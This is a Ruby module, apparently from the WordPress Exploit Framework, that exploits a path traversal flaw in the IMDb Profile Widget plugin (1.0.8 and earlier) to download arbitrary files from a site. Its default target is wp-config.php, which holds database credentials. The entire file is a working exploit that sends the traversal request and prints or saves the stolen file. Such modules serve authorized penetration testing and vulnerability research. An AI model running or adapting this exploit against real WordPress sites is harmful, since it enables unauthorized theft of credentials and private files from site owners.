class Wpxf::Auxiliary::ImdbProfileWidgetArbitraryFileDownload < Wpxf::Module
  include Wpxf

  def initialize
    super

    update_info(
      name: 'IMDb Profile Widget <= 1.0.8 Arbitrary File Download',
      desc: 'This module exploits a vulnerability in the IMDb Profile Widget plugin '\
            'which allows you to download any arbitrary file accessible '\
            'by the user the web server is running as.',
      author: [
        'CrashBandicot @DosPerl',          # Disclosure
        'Rob Carr <rob[at]rastating.com>'  # WPXF module
      ],
      references: [
        ['WPVDB', '8426'],
        ['URL', 'https://packetstormsecurity.com/files/136447/']
      ],
      date: 'Mar 26 2016'
    )

    register_options([
      Wpxf::Options::StringOption.new(
        name: 'remote_file',
        desc: 'The path to the remote file (relative to /wp-content/plugins/imdb-widget/)',
        required: true,
        default: '../../../wp-config.php'
      ),
      Wpxf::Options::StringOption.new(
        name: 'export_path',
        desc: 'The file to save the file to',
        required: false
      )
    ])
  end

  def check
    check_plugin_version_from_readme('imdb-widget', '1.0.9')
  end

  def remote_file
    normalized_option_value('remote_file')
  end

  def export_path
    normalized_option_value('export_path')
  end

  def downloader_url
    normalize_uri(wordpress_url_wp_content, 'plugins', 'imdb-widget', 'pic.php')
  end

  def request_file
    if export_path.nil?
      emit_info 'Requesting file...'
      return execute_get_request(
        url: downloader_url,
        params: { 'url' => remote_file }
      )
    else
      emit_info 'Downloading file...'
      return download_file(
        url: downloader_url,
        method: :get,
        params: { 'url' => remote_file },
        local_filename: export_path
      )
    end
  end

  def run
    return false unless super

    res = request_file

    if res.nil? || res.timed_out?
      emit_error 'Request timed out, try increasing the http_client_timeout'
      return false
    end

    if res.code != 200
      emit_error "Server responded with code #{res.code}"
      return false
    end

    if export_path.nil?
      emit_success "Result: \n#{res.body}"
    else
      emit_success "Downlaoded file to #{export_path}"
    end

    true
  end
end
